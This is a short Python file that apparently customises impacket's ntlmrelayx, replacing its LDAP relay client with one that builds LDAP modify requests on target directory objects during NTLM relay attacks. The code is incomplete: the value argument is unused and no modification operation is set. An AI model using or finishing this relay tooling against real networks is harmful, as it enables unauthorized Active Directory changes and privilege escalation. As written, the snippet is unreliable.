from impacket.examples.ntlmrelayx.clients import ldaprelayclient
from impacket.ldap.ldapasn1 import ModifyRequest


class CustomLDAPRelayClient(ldaprelayclient.LDAPSRelayClient):
    def modify_target(self, dn, attribute, value):
        request = ModifyRequest()
        request["object"] = dn
        request["changes"][0]["modification"]["type"] = attribute
        return request


def install(relay_clients):
    # Swaps the stock LDAP relay client for the custom modifier above.
    relay_clients.PROTOCOL_CLIENTS["LDAP"] = CustomLDAPRelayClient
